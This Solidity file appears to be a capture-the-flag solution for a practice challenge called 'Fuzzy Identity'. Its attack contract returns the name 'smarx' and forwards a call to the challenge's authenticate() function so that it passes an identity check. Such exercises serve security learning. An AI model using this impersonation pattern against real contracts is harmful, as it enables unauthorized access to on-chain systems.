// SPDX-License-Identifier: MIT
pragma solidity >=0.7.5 <0.8.0;

contract FuzzyIdentityAttack {
    address public challenge;

    constructor(address payable _challenge) {
        challenge = _challenge;
    }

    function name() public view returns (bytes32) {
        return bytes32("smarx");
    }

    function authenticate() public {
        (bool success,) = challenge.call(abi.encodeWithSignature("authenticate()"));
        require(success, "failed to authenticate");
    }
}
